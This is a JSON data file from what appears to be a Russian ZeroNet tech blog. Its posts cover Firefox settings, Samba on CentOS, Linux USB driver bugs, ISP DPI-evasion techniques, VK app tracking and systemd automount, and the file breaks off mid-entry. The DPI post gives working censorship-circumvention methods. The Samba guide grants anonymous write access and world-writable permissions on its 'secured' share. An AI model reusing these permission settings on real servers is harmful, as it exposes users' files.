{
	"title": "БлогПост",
	"description": "Бложик о  кибермире. Лайфхаки и простые хаки. Записная книжка. Новости ИТ . OpenSource, GNU/Linux, VoIP,  Network, p2p, f2f, IoT, embedded, virtualisation",
	"links": "- [Source code](https://github.com/HelloZeroNet)",
	"next_post_id": 75,
	"demo": false,
	"modified": 1537265139,
	"post": [
		{
			"post_id": 73,
			"title": "Тонкий тюнинг FireFox",
			"date_published": 1528562395.607,
			"body": "тонкие настройки Mozilla FireFox\n---\nFAQ\n\nНастройки меняются через about:config.\n\nQ: Проблемы с отрисовкой интерфейса, изображений или видео. Внезапные падения браузера.\nA: Попробуйте отключить аппаратное ускорение: layers.acceleration.disabled -> true \nТакже проблему может решить обновление видеодрайверов либо возврат к более старой версии. Или обновление самого Firefox до беты/откат к ESR.\n\nQ: Как уменьшить потребление памяти? \nA: Можно снизить число контент-процессов. Для этого следует снять чекбокс Use recommended performance settings в Preferences -> General, после чего появится список, где выбирается подходящее значение.\n\nQ: О блокировке неподписанных расширений. \nA: Начиная с Firefox 48, в официальных релизных и бета-билдах Firefox заблокирована установка не подписанных Mozilla аддонов. Ниже приведены различные решения.\n\nВыпускаются специальные сборки, где требование подписей отключается настройкой xpinstall.signatures.required -> false. Firefox ESR тоже не имеет данной проблемы.\nЕсть хак, позволяющий обойти это ограничение даже на официальных сборках.\nЕсли вы используете Linux, вероятно, мейнтейнеры вашего дистрибутива уже собрали Firefox без флага обязательного требования подписей, и его можно отключить вышеописанной настройкой.\nQ: Тормозит видео на YouTube в высоких разрешениях. \nA: Кодек VP9 требует мощного процессора. Может помочь отключение media.mediasource.webm.enabled - тогда видео будут отдаваться в H.264. Отключение этой настройки не сломает обычные WebM.\n\nQ: Как запретить проигрывание HTML5-медиа в фоновой вкладке? \nA: Firefox 51+: media.block-autoplay-until-in-foreground -> true \nПроигрывание начнется при первом переключении на вкладку с открытым видео или аудио.\n\nQ: Как отключить предупреждение при переходе сайта в полноэкранный режим в Firefox 43+? \nA: full-screen-api.warning.timeout -> 0\n\nQ: Как отключить анимацию затемнения при переходе сайта в полноэкранный режим? \nA: full-screen-api.transition.timeout -> 0 \nfull-screen-api.transition-duration.enter -> \"0 0\" (без кавычек) \nfull-screen-api.transition-duration.leave -> \"0 0\" (без кавычек)\n\nQ: Как искать в разных поисковиках через адресную строку? \nA: Используя префиксы-кейворды (g Google, w Wikipedia, etc), настраивающиеся в Preferences -> Search даблкликом по ячейкам второй колонки.\n\nQ: Как отключить беспрефиксный поиск в поисковике по умолчанию через адресную строку? \nA: keyword.enabled -> false\n\nQ: Как отключить кнопки поисковиков в выпадающем списке под адресной строкой? \nA: browser.urlbar.oneOffSearches -> false\n\nQ: Что за специальная тема для разработчиков? \nA: Тема, использующаяся в Firefox Developer Edition. В Firefox 53+ включается через about:addons, на вкладке Appearance. Аддон, включающий ее на более ранних релизах.\n\nQ: Как копировать ссылки c кириллическим текстом в исходном виде, не закодированном percent-encoding (%D0%9B%D0%B8%D1%81 -> Лис)? \nA: Firefox 53+: browser.urlbar.decodeURLsOnCopy -> true\n\nQ: Как ускорить прокрутку колесом мыши? \nA: mousewheel.min_line_scroll_amount -> 35 \nЗначение подбирается по вкусу. Другие твики описаны здесь.\n\nQ: Как сделать скриншот всей страницы? \nA: Shift-F2: screenshot --fullpage <имя файла опционально> \nТакже можно использовать кнопку скриншота в Developer Tools (Ctrl+Shift+I), предварительно включив ее: devtools.command-button-screenshot.enabled -> true. Сверхдлинные страницы не сохраняет.\n\nQ: Как уменьшить ширину вкладки, чтобы меньше их прокручивать? \nA: Firefox до 57: при помощи UserCSS. Firefox 57+: browser.tabs.tabMinWidth\n\nQ: Как вернуть старую поисковую строку/старый диалог настроек браузера? \nA: Воспользоваться Classic Theme Restorer или пользовательским стилем.\n\nQ: Как вернуть информацию о загрузках, скрытую в Firefox 54? \nA: При помощи UserCSS.\n\nQ: Как применять свои CSS к интерфейсу браузера в Firefox 57+? \nA: Используя userChrome.css. Подробнее - см. раздел о стилях в приложении.\n\nQ: Как иметь отдельные наборы cookies для разных вкладок? \nA: При помощи контейнеров, включив все настройки privacy.userContext.*. После этого в Customize появится новая кнопка для открытия вкладки в контейнере. Опции контейнеров находятся в Preferences -> Privacy.\n\nQ: Куда девается старая история браузинга? \nA: Удаляется для улучшения производительности. Причем история ограничена не давностью, а числом записей, так что активные пользователи браузера могут упереться в лимит раньше. Значение вычисляется, исходя из характеристик ПК, и пишется в настройку places.history.expiration.transient_current_max_pages. Если вы считаете, что оно слишком низкое, можно установить значение вручную, но в другой настройке: places.history.expiration.max_pages. Подробнее: статья, настройка, сам алгоритм.\n\nQ: Как добавить поисковик в браузер? \nA: Экспортировать встроенные скриптом, создать по их образу и подобию новый файл в формате OpenSearch, затем импортировать другим скриптом.\n\nподробнее тут: https://github.com/The-OP/Fox "
		},
		{
			"post_id": 72,
			"title": "Установка и конфигурация Samba на CentOS 7",
			"date_published": 1528460356.394,
			"body": "Разберёмся, как сконфигурировать samba на CentOS 7 с анонимными и защищёнными samba-серверами. Samba является пакетом программ с открытым исходным кодом, который позволяет уверенно обращаться к файлам и принтерам на ОС, работающих по протоколу SMB/CIFS. Samba находится в свободном доступе, в отличие от других программ SMB/CIFS, и совместим, допускает возможность взаимодействия сетей, включающих сервера под управлением Linux/Unix, так и клиентов, работающими на Windows.\n---\n**1. Предварительные замечания**\n\nВ нашем случае установка сервера samba будет производиться на специально установленном сервере CentOS версии 7.0. Также нам понадобится ПК с установленным Windows для проверки доступности samba. В данном случае сервер под CentОS будет иметь имя хоста в виде linux.example.com и 192.168.0.100 в качестве IP-адреса.\n```\nВнимание: В Windows домен рабочей станции должен совпадать с доменом в CentOS.\n```\nДля проверки значения в Windows введите в командной строке следующее:\n```\nnet config workstation\n```\nВ нашем случае домен рабочей станции имеет значение HOME.\n\n![](http://drach.pro/images/linux/linux-samba-cmd.png)\n\nУбедитесь, что рабочая группа будет иметь одинаковое имя как под Linux, так и под Windows.\n\nДля того, чтобы сделать доступным компьютер под Windows, необходимо добавить IP-адрес вашего сервера в hosts.\n\nблокнот C:\\Windows\\System32\\drivers\\etc\\hosts\n\nВ нашем случае введем следующее:\n```\n[...]\n\n192.168.0.100 \tlinux.example.com\tcentos\n```\nЗатем просто сохраним данное изменение.\n\n**2. Анонимный доступ средствами samba**\n\nСначала установим samba с возможностью анонимного доступа. Для установки samba выполните следующую команду:\n```\nyum install samba samba-client samba-common\n```\nТаким образом вы установите samba актуальной версии.\n\nДля того, чтобы сконфигурировать samba потребуется отредактировать файл /etc/samba/smb.conf, перед редактированием следует сделать резервное копирование оригинального файла /etc/samba/smb.conf.bak\n```\ncp /etc/samba/smb.conf /etc/samba/smb.conf.bak\n```\nОткрываем для редактирования файл:\n```\nmcedit /etc/samba/smb.conf\n```\nВносим изменения:\n```\n[global]\n\nworkgroup = HOME\n\nserver string = Samba Server %v\n\nnetbios name = centos\n\nsecurity = user\n\nmap to guest = bad user\n\ndns proxy = no\n\n#===Share Definitions\n\n[Anonymous]\n\npath = /samba/anonymous\n\nbrowsable =yes\n\nwritable = yes\n\nguest ok = yes\n\nread only = no\n```\nПочти всё готово, перезапускаемся:\n```\nmkdir -p /samba/anonymous\n\nsystemctl enable smb.service\n\nsystemctl enable nmb.service\n\nsystemctl restart smb.service\n\nsystemctl restart nmb.service\n```\nНа данном этапе сетевой экран CentOS 7.0 заблокирует доступ службы samba, чтобы решить эту проблему, выполним следующее:\n```\nfirewall-cmd --permanent --zone=public --add-service=samba\n\nfirewall-cmd --reload\n```\nНастроить сетевой экран по всем правилам поможет специальная статья.\n\n![](http://drach.pro/images/linux/linux-samba-cmd-2.png)\nWin+R\n\nТеперь вы можете обмениваться файлами Centos 7.0 с windows, для этого в командной строке Win+R необходимо выполнить  \\\\centos:\n\nДалее в windows откройте папку и попытайтесь создать текстовый документ, но при попытке создания документа появится сообщение об ошибке прав доступа.\n\nДалее необходимо проверить права доступа для общего документа.\n```\nls -l\n\ndrwxr-xr-x.\n2 root root anonymous\n```\n\nДля получения прав доступа для анонимного пользователя введите следующее:\n```\ncd /samba\n\nchmod -R 755 anonymous/\n\nchown -R nobody:nobody anonymous/\n\nls -l anonymous/\n\ntotal 0\n\ndrwxr-xr-x.\n2 nobody   nobody anonymous\n```\n\nДалее нам потребуется разрешение selinux для конфигурации samba:\n```\nchcon -t samba_share_t anonymous/\n```\nТеперь анонимный пользователь может создавать и просматривать cодержимое.\n\nМожно выполнить встречную проверку следующим образом:\n```\nls -l anonymous/\n\ntotal 0\n\n-rwxr--r--. 1 nobody  nobody 0  anonymous.txt\n\n[root samba]#\n```\n\n**3. Защищённый samba-сервер**\n\nСоздадим группу smbgrp и пользователя dve для доступа к samba-серверу с необходимой аутентификацией:\n```\ngroupadd smbgrp\n\nuseradd dve -G smbgrp\n\nsmbpasswd -a dve\n\n[root samba]# smbpasswd -a dve\n\nNew SMB password:<-вашsambaпароль\n\nRetype new SMB password:<--вашsambaпароль\n\nAdded user dve.\n\n[root samba]#\n```\nСоздадим папку secured в /samba и предоставим соответствующие права доступа:\n```\nmkdir -p /samba/secured\n\ncd /samba && chmod -R 777 secured/\n```\nТеперь нам снова понадобится разрешение Selinux:\n```\ncd /samba\n\nchcon -t samba_share_t secured/\n```\nСнова редактируем файл конфигурации /etc/samba/smb.conf:\n```\n[...]\n\n[secured]\n\n path = /samba/secured\n\n valid users = @smbgrp\n\n guest ok = no\n\n writable = yes\n\n browsable = yes\n```\nДалее потребуется перезапуск\n```\nsystemctl restart smb.service\n\nsystemctl restart nmb.service\n```\n\nТеперь проверяем настройки хитрой командой testparm\n```\n[root]# testparm\n\nLoad smb config files from /etc/samba/smb.conf\n\nrlimit_max: increasing rlimit_max (1024) to minimum Windows limit (16384)\n\nProcessing section \"[Anonymous]\"\n\nProcessing section \"[secured]\"\n\nLoaded services file OK.\n\nServer role: ROLE_STANDALONE\n\nPress enter to see a dump of your service definitions <--нажмитеENTER\n\n[global]\n\n\tnetbios name = CENTOS\n\n\tserver string = Samba Server %v\n\n\tmap to guest = Bad User\n\n\tdns proxy = No\n\n\tidmap config * : backend = tdb\n\n[Anonymous]\n\n\tpath = /samba/anonymous\n\n\tread only = No\n\n\tguest ok = Yes\n\n[secured]\n\n\tpath = /samba/secured\n\n\tvalid users = @smbgrp\n\n\tread only = No\n\n[root samba]#\n\nbrowsable = yes.\n```\nВы снова столкнётесь с проблемой прав доступа. Для получения прав доступа пользователя dve выполним:\n```\ncd /samba\n\nchown -R dve:smbgrp secured//\n```\n\nТеперь пользователь samba имеет права доступа для записи в папку.\n\nПоздравляю, вы только что установили samba сервер на CentOS7.0!\n\nhttp://drach.pro/blog/linux/item/46-centos-7-samba-server"
		},
		{
			"post_id": 71,
			"title": "Россиянин нашел в ядре Linux кучу «дыр» из-за кривых драйверов USB",
			"date_published": 1510308870.504,
			"body": "Драйверы USB в ядре Linux полны уязвимостей, часть из которых можно использовать для запуска произвольного кода и захвата контроля над пользовательскими системами. Исследователь Google Андрей Коновалов за последние месяцы нашёл почти полтора десятка таких багов.\n---\n**Полтора десятка свежих «дыр»**\n\nЭксперт по безопасности компании Google Андрей Коновалов проинформировал сообщество разработчиков Linux о 14 свежеобнаруженных уязвимостях.\n\nПо его словам, все эти уязвимости можно эксплуатировать с помощью специально подготовленной флэшки - и физического доступа к компьютеру потенциальной жертвы.\n\nЭти полтора десятка уязвимостей входят в более широкий список, составленный Коноваловым.\n\nВ общей сложности за последние несколько месяцев он сумел найти 79 «багов» в USB-драйверах ядра Linux. Большая их часть приводит только лишь к зависанию или вынужденной перезагрузке операционной системы, но некоторые позволяют злоумышленникам повышать привилегии в системе и запускать вредоносный код.\n\n**Другие исследователи пытались привлечь внимание к проблеме**\n\nКоновалов не единственный исследователь, занимающийся проблемами безопасности USB-драйверов в ядре Linux.\n\n![](http://filearchive.cnews.ru/img/news/2017/11/10/konovalov600.jpg)\nЭксперт по безопасности Google Андрей Коновалов\n\nЭксперты Университета Лондона в 2017 г. представили инструмент POTUS, предназначенный для поиска как раз таких уязвимостей. С его помощью удалось найти несколько критических багов, в том числе один, остававшийся невыявленным с 2003 г.\n\nСоздатели POTUS опубликовали исследование, в котором отметили, что большая часть USB-драйверов в Linux не проходят надлежащего тестирования, что и приводит к проблемам. Ранее и другие эксперты пытались привлечь внимание к этой проблеме, но с невеликим успехом.\n\nМежду тем, такие драйверы могут быть использованы для проникновения в изолированные (air-gapped) сети и вывода данных из них. Фактически, это единственный способ красть данные оттуда, поэтому спрос на уязвимости в USB-драйверах у киберпреступников всегда высок.\n\n[cnews](http://safe.cnews.ru/news/top/2017-11-10_rossiyanin_nashel_v_yadre_linux_kuchu_dyr_izza)"
		},
		{
			"post_id": 70,
			"title": "Автономный способ обхода DPI и эффективный способ обхода блокировок сайтов по IP-адресу",
			"date_published": 1503437947.452,
			"body": "Провайдеры Российской Федерации, в большинстве своем, применяют системы глубокого анализа трафика (DPI, Deep Packet Inspection) для блокировки сайтов, внесенных в реестр запрещенных. Не существует единого стандарта на DPI, есть большое количество реализации от разных поставщиков DPI-решений, отличающихся по типу подключения и типу работы.\n---\nСуществует два распространенных типа подключения DPI: пассивный и активный.\n\n****Пассивный DPI****\nПассивный DPI — DPI, подключенный в провайдерскую сеть параллельно (не в разрез) либо через пассивный оптический сплиттер, либо с использованием зеркалирования исходящего от пользователей трафика. Такое подключение не замедляет скорость работы сети провайдера в случае недостаточной производительности DPI, из-за чего применяется у крупных провайдеров. DPI с таким типом подключения технически может только выявлять попытку запроса запрещенного контента, но не пресекать ее. Чтобы обойти это ограничение и заблокировать доступ на запрещенный сайт, DPI отправляет пользователю, запрашивающему заблокированный URL, специально сформированный HTTP-пакет с перенаправлением на страницу-заглушку провайдера, словно такой ответ прислал сам запрашиваемый ресурс (подделывается IP-адрес отправителя и TCP sequence). Из-за того, что DPI физически расположен ближе к пользователю, чем запрашиваемый сайт, подделанный ответ доходит до устройства пользователя быстрее, чем настоящий ответ от сайта.\n\n**Выявляем и блокируем пакеты пассивного DPI**\nПоддельные пакеты, формируемые DPI, легко обнаружить анализатором трафика, например, Wireshark.\nПробуем зайти на заблокированный сайт:\n![](https://habrastorage.org/getpro/habr/post_images/140/ae8/4e2/140ae84e2bc2c6965f2e896ef2cc5bb6.png)\n\nМы видим, что сначала приходит пакет от DPI, с HTTP-перенаправлением кодом 302, а затем настоящий ответ от сайта. Ответ от сайта расценивается как ретрансмиссия и отбрасывается операционной системой. Браузер переходит по ссылке, указанной в ответе DPI, и мы видим страницу блокировки.\n\nРассмотрим пакет от DPI подробнее:\n![](https://habrastorage.org/getpro/habr/post_images/a59/be3/5db/a59be35dbd7c16dd386db5079d6beaea.png)\n```\nHTTP/1.1 302 Found\nConnection: close\nLocation: http://warning.rt.ru/?id=17&st=0&dt=195.82.146.214&rs=http%3A%2F%2Frutracker.org%2F\n```\nВ ответе DPI не устанавливается флаг «Don't Fragment», и в поле Identification указано 1. Серверы в интернете обычно устанавливают бит «Don't Fragment», и пакеты без этого бита встречаются нечасто. Мы можем использовать это в качестве отличительной особенности пакетов от DPI, вместе с тем фактом, что такие пакеты всегда содержат HTTP-перенаправление кодом 302, и написать правило iptables, блокирующее их:\n```\n# iptables -A FORWARD -p tcp --sport 80 -m u32 --u32 \"0x4=0x10000 && 0x60=0x7761726e && 0x64=0x696e672e && 0x68=0x72742e72\" -m comment --comment \"Rostelecom HTTP\" -j DROP\n```\nЧто это такое? Модуль u32 iptables позволяет выполнять битовые операции и операции сравнения над 4-байтовыми данными в пакете. По смещению 0x4 хранится 2-байтное поле Indentification, сразу за ним идут 1-байтные поля Flags и Fragment Offset.\nНачиная со смещения 0x60 расположен домен перенаправления (HTTP-заголовок Location).\nЕсли Identification = 1, Flags = 0, Fragment Offset = 0, 0x60 = «warn», 0x64 = «ing.», 0x68 = «rt.ru», то отбрасываем пакет, и получаем настоящий ответ от сайта.\n\nВ случае с HTTPS-сайтами, DPI присылает TCP Reset-пакет, тоже с Identification = 1 и Flags = 0.\n\n**Активный DPI**\nАктивный DPI — DPI, подключенный в сеть провайдера привычным образом, как и любое другое сетевое устройство. Провайдер настраивает маршрутизацию так, чтобы DPI получал трафик от пользователей к заблокированным IP-адресам или доменам, а DPI уже принимает решение о пропуске или блокировке трафика. Активный DPI может проверять как исходящий, так и входящий трафик, однако, если провайдер применяет DPI только для блокирования сайтов из реестра, чаще всего его настраивают на проверку только исходящего трафика.\n\nСистемы DPI разработаны таким образом, чтобы обрабатывать трафик с максимально возможной скоростью, исследуя только самые популярные и игнорируя нетипичные запросы, даже если они полностью соответствуют стандарту.\n\n**Изучаем стандарт HTTP**\nТипичные HTTP-запросы в упрощенном виде выглядят следующим образом:\n```\nGET / HTTP/1.1\nHost: habrahabr.ru\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/50.0\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n```\nЗапрос начинается с HTTP-метода, затем следует один пробел, после него указывается путь, затем еще один пробел, и заканчивается строка протоколом и переносом строки CRLF.\nЗаголовки начинаются с большой буквы, после двоеточия ставится символ пробела.\n\nДавайте заглянем в последнюю версию стандарта HTTP/1.1 от 2014 года. Согласно RFC 7230, HTTP-заголовки не зависят от регистра символов, а после двоеточия может стоять произвольное количество пробелов (или не быть их вовсе).\n```\n   Each header field consists of a case-insensitive field name followed\n   by a colon (\":\"), optional leading whitespace, the field value, and\n   optional trailing whitespace.\n\n     header-field   = field-name \":\" OWS field-value OWS\n\n     field-name     = token\n     field-value    = *( field-content / obs-fold )\n     field-content  = field-vchar [ 1*( SP / HTAB ) field-vchar ]\n     field-vchar    = VCHAR / obs-text\n\n     obs-fold       = CRLF 1*( SP / HTAB )\n                    ; obsolete line folding\n```\nOWS — опциональный один или несколько символов пробела или табуляции, SP — одинарный символ пробела, HTAB — табуляция, CRLF — перенос строки и возврат каретки (\\r\\n).\n\nЭто значит, что запрос ниже полностью соответствует стандарту, его должны принять многие веб-серверы, придерживающиеся стандарта:\n```\nGET / HTTP/1.1\nhoSt:habrahabr.ru\nuser-agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/50.0\nAccept-Encoding:           gzip, deflate, br\ncoNNecTion:\tkeep-alive      ← здесь символ табуляции между двоеточием и значением\n```\nНа деле же, многие веб-серверы не любят символ табуляции в качестве разделителя, хотя подавляющее большинство серверов нормально обрабатывает и отсутствие пробелов между двоеточием в заголовках, и множество пробелов.\n\nСтарый стандарт, RFC 2616, рекомендует снисходительно парсить запросы и ответы сломанных веб-северов и клиентов, и корректно обрабатывать произвольное количество пробелов в самой первой строке HTTP-запросов и ответов в тех местах, где требуется только один:\n>Clients SHOULD be tolerant in parsing the Status-Line and servers tolerant when parsing the Request-Line. In particular, they SHOULD accept any amount of SP or HT characters between fields, even though only a single SP is required.\nЭтой рекомендации придерживаются далеко не все веб-серверы. Из-за двух пробелов между методом и путем ломаются некоторые сайты.\n\n**Спускаемся на уровень TCP**\nСоединение TCP начинается с SYN-запроса и SYN/ACK-ответа. В запросе клиент, среди прочей информации, указывает размер TCP-окна (TCP Window Size) — количество байт, которые он готов принимать без подтверждения передачи. Сервер тоже указывает это значение. В интернете используется значение MTU 1500, что позволяет отправить до 1460 байтов данных в одном TCP-пакете.\nЕсли сервер указывает размер TCP-окна менее 1460, клиент отправит в первом пакете данных столько, сколько указано в этом параметре.\n\nЕсли сервер пришлет TCP Window Size = 2 в SYN/ACK-пакете (или мы его изменим на это значение на стороне клиента), то браузер отправит HTTP-запрос двумя пакетами:\n\nПакет 1:\n``` GE ```\nПакет 2:\n```\nT / HTTP/1.1\nHost: habrahabr.ru\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/50.0\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n```\n\n**Используем особенности HTTP и TCP для обхода активного DPI**\nМногие решения DPI ожидают заголовки только в стандартном виде.\nДля блокировки сайтов по домену или URI, они ищут строку *\"Host: \"* в теле запроса. Стоит заменить заголовок «Host» на «hoSt» или убрать пробел после двоеточия, и перед вами открывается запрошенный сайт.\nНе все DPI можно обмануть таким простым трюком. DPI некоторых провайдеров корректно анализируют HTTP-заголовки в соответствии со стандартом, но не умеют собирать TCP-поток из нескольких пакетов. Для таких DPI подойдет «фрагментирование» пакета, путем искусственного уменьшения TCP Window Size.\n\nВ настоящий момент, в РФ DPI устанавливают и у конечных провайдеров, и на каналах транзитного трафика. Бывают случаи, когда одним способом можно обойти DPI вашего провайдера, но вы видите заглушку транзитного провайдера. В таких случаях нужно комбинировать все доступные способы.\n\n**Программа для обхода DPI**\nЯ написал программу для обхода DPI под Windows: [GoodbyeDPI](https://github.com/ValdikSS/GoodbyeDPI).\nОна умеет блокировать пакеты с перенаправлением от пассивного DPI, заменять Host на hoSt, удалять пробел между двоеточием и значением хоста в заголовке Host, «фрагментировать» HTTP и HTTPS-пакеты (устанавливать TCP Window Size), и добавлять дополнительный пробел между HTTP-методом и путем.\nПреимущество этого метода обхода в том, что он полностью автономный: нет внешних серверов, которые могут заблокировать.\n\nПо умолчанию активированы опции, нацеленные на максимальную совместимость с провайдерами, но не на скорость работы. Запустите программу следующим образом:\n```\ngoodbyedpi.exe -1 -a\n```\nЕсли заблокированные сайты стали открываться, DPI вашего провайдера можно обойти.\nПопробуйте запустить программу с параметром -2 и зайти на заблокированный HTTPS-сайт. Если все продолжает работать, попробуйте режим -3 и -4 (наиболее быстрый).\nНекоторые провайдеры, например, Мегафон и Yota, не пропускают фрагментированные пакеты по HTTP, и сайты перестают открываться вообще. С такими провайдерами используйте опцию -3 -a\n\n**Эффективное проксирование для обхода блокировок по IP**\nВ случае блокировок по IP-адресу, провайдеры фильтруют только исходящие запросы на IP-адреса из реестра, но не входящие пакеты с этих адресов.\nПрограмма [ReQrypt](https://reqrypt.org/reqrypt.html) работает как эффективный прокси-сервер: исходящие от клиента пакеты отправляются на сервер ReQrypt в зашифрованном виде, сервер ReQrypt пересылает их серверу назначения *с подменой исходящего IP-адреса на клиентский*, сервер назначения отвечает клиенту напрямую, минуя ReQrypt.\n\n![](https://habrastorage.org/getpro/habr/post_images/113/95c/b0b/11395cb0b075eea1b22804a9b669e8c6.png)\n\nЕсли наш компьютер находится за NAT, мы не можем просто отправить запрос на сервер ReQrypt и ожидать ответа от сайта. Ответ не дойдет, т.к. в таблице NAT не создана запись для этого IP-адреса.\nДля «пробива» NAT, ReQrypt отправляет первый пакет в TCP-соединении напрямую сайту, но с TTL = 3. Он добавляет запись в NAT-таблицу роутера, но не доходит до сайта назначения.\n\nДолгое время разработка была заморожена из-за того, что автор не мог найти сервер с возможностью спуфинга. Спуфинг IP-адресов часто используется для амплификации атак через DNS, NNTP и другие протоколы, из-за чего он запрещен у подавляющего большинства провайдеров. Но сервер все-таки был найден, хоть и не самый удачный. Разработка продолжается.\n\n**Заключение и TL;DR**\n[GoodbyeDPI](https://github.com/ValdikSS/GoodbyeDPI) — программа под Windows, позволяющая обходить пассивные и активные DPI. Просто скачайте и запустите ее, и заблокированные сайты станут снова доступны.\nДля Linux есть аналогичная программа — [zapret](https://github.com/bol-van/zapret).\n\nИспользуйте кроссплатформенную программу [ReQrypt](https://reqrypt.org/reqrypt.html), если ваш провайдер блокирует сайты по IP-адресу.\n\nОпределить тип блокировки сайтов можно программой [Blockcheck](https://github.com/ValdikSS/blockcheck). Если в тестах DPI вы видите, что сайты открываются, или видите строку «обнаружен пассивный DPI», то GoodbyeDPI вам поможет. Если нет, используйте ReQrypt.\n\nДополнительная полезная информация есть [здесь](https://rutracker.org/forum/viewtopic.php?t=5403670) и [здесь](https://rutracker.org/forum/viewtopic.php?t=5126394).\n\nhttps://habrahabr.ru/post/335436/"
		},
		{
			"post_id": 69,
			"title": "Шпионь или умри. Как мобильное приложение vk.com сливает все данные",
			"date_published": 1501612582.62,
			"body": "Приложение «ВКонтакте» следит за пользователями\n\nПриложение отправляет на сервер действия пользователя, а также местоположение устройства \n\n![](https://habrastorage.org/web/94b/93c/65a/94b93c65a6ac44b7a0109534e62839cd.png)\n---\nРоссийский студент и программист Владислав Велюга отсниффил программой Shark for Root трафик мобильного приложения «ВКонтакте» и опубликовал результаты расследования ([часть 1](http://telegra.ph/O-tom-kak-VKontakte-sobiraet-informaciyu-o-nas-07-29), [часть 2](http://telegra.ph/O-tom-kak-VKontakte-sobiraet-informaciyu-o-nas-chast-2-07-31)). Он пишет, что раньше в результатах сниффинга не было ничего необычного, а сейчас появилось. Сейчас соцсеть начала передавать на сервер так много данных буквально о каждом действии пользователя, что это можно назвать слежкой. \n\nК сожалению, теперь в официальную версию клиента включены следящие модули, в том числе myTracker от Mail.ru \n\n![](http://telegra.ph/file/f9ae2d93811dc49281ae2.png)\n(скриншот после декомпиляции APK-файла).\n\nВладислав исследовал версию официального клиента 4.12.1 для Android.\n\nИсследование показало, что на сервер «ВКонтакте» передаются практически все действия пользователя при работе с приложением. При этом необходимость сбора многих данных трудно объяснить (хотя можно понять, если подумать, зачем это нужно серверу). Например, при заходе в раздел «Аудио» передаются геоданные, а в разделе с видеозаписями передаётся информация о таких событиях как «volume_on», «volume_off», «fullscreen_on», «fullscreen_off» (переход и выход в/из полноэкранного режима), событие «video_play», которое просто отсылает текущую позицию просмотра видео, где-то с периодичностью 10-20 секунд.\n\nВ других случаях передаётся информация о ближайших точках доступа WiFi, подгружаются метрики через невидимую WebView и т. д. Техподдержка «ВКонтакте» ответила:\n\n![](http://telegra.ph/file/7264a1b828ee4b9a7abc7.jpg)\n\n, что отказаться от сбора этих данных «не получится, так как для работы приложения все эти сведения необходимы».\n\n![](https://habrastorage.org/getpro/geektimes/post_images/c39/01b/b64/c3901bb64fb6e7c5f06e9d78e18dc78e.png)\n![](https://habrastorage.org/getpro/geektimes/post_images/3f7/9b8/017/3f79b8017ce20b22eeb64a6ee0a0e9b3.png)\n\nАвтор исследования подчёркивает, что в неофициальном клиенте VK Coffee (модификация официального, с вырезанными метриками и пр.) таких сливов замечено не было.\n\nСам автор VK Coffee Эдуард Безменов прокомментировал: «Самый ад то, что libverifyот мыла.ру собирает серийники sim-карт, а mytracker — lac и cid». Он сказал, что слив подобных данных во «ВКонтакте» он наблюдал и раньше, и в его модификации клиента эта функция давно отключена. \n\nПозже в комментарии для газеты «Ведомости» представитель компании Евгений Красников [объяснил](https://www.vedomosti.ru/technology/articles/2017/08/01/727286-v-kontakte-dannih-polzovatelyah), что «ВКонтакте» никогда не скрывала, что собирает такую информацию для рекламы, оптимизации, рекомендаций. Другая информация тоже необходима. Например, по смене идентификационного кода sim-карты можно понять, менялся ли у пользователя телефон, и решить, отправлять ли ему код для валидации. Местоположение при прослушивании аудиозаписей нужно запрашивать из-за требований правообладателей и т. д. Да и вообще, все популярные приложения собирают подобные персональные данные, иначе они проиграют конкурентам."
		},
		{
			"post_id": 68,
			"title": "Автомонтирование файловых систем с systemd",
			"date_published": 1498058038.306,
			"body": "Среди множества функций, которые предоставляет systemd, есть одна, которую несправедливо забыли. Это функция автомонтирования. При настройке автомонтирования указанный каталог будет подмонтирован только после первого обращения к нему (точнее, прямо во время).\n---\n*NFS over VPN*\n\nКонкретный пример: у меня есть удалённый сервер, на котором есть интересующий меня каталог. Я хочу иметь этот каталог локально на своей машине. Протокол доступа — nfs. Т.к. он не имеет шифрования, то разумным решением выглядит использование vpn-канала до сервера.\n\nПри этом я хочу монтировать его на ходу и отмонтировать через некоторое время, чтобы не испытывать странных затруднений из-за тупящей nfs при лежащей сети. Таймаут монтирования куда более гуманная ошибка, чем таймаут nfs на ls.\n\n*Как оно устроено*\n\nSystemd имеет специальный вид automount-юнитов, которые позволяют автоматически монтировать указанный каталог.\n\nВажно: automount-юниты это не «mount-юниты с автомонтированием», они не могут иметь в себе параметры монтирования. Вместо этого, они (при обращении к каталогу) всего лишь вызывают mount-юнит для указанного каталога.\n\nСоответственно, при конфигурации:\n\n- Опции монтирования, устройство (или сервер в случае NFS) указываются в mount-юните\n- Зависимости и install-секция указываются в automount-юните\n- Связка automount-юнита и mount-юнита происходит по параметру where\n\nЭто же можно заметить по структуре самих юнитов. У mount-юнита есть секция [Mount] в которой может быть множество параметров. У automount-юнита такой секции быть не должно, а вместо этого есть секция [Automount], в которой могут быть всего несколько параметров: Where, DirectoryMode и TimeoutIdleSec.\n\n*Практический пример*\n```\n/etc/systemd/system/media-nfs.mount:\n[Unit]\nDescription=NFS share\n[Mount]\nWhat=server.url.example.com:/srv/nfs_share\nWhere=/media/nfs\nType=nfs4\nOptions=rw\nDirectoryMode=0755\n```\n```\n/etc/systemd/system/media-nfs.automount:\n[Unit]\nDescription=NFS share\nRequires=openvpn@vpn.service\nRequires=network-online.target\n[Automount]\nWhere=/media/nfs\nTimeoutIdleSec=301\n[Install]\nWantedBy=graphical.target\n```\nНаблюдение: при том, что для mount-юнита нормальное состояние это active (mounted), то для automount — active (running), как для сервиса.\n\nЕсли же automount ещё не случился, то статус будет «active (waiting)».\n\nПосле настройки automount'а нужно сделать (sudo) systemctl daemon-reload, и сделать ls /media/nfs (для примера выше) — после некоторой задержки от монтирования nfs'а, мы увидим содержимое файлов на удалённом сервере.\n\n[habrahabr](https://habrahabr.ru/post/331240/)"
		},
		{
			"post_id": 67,
			"title": "Intel ME. Как избежать восстания машин?",
			"date_published": 1497017757.615,
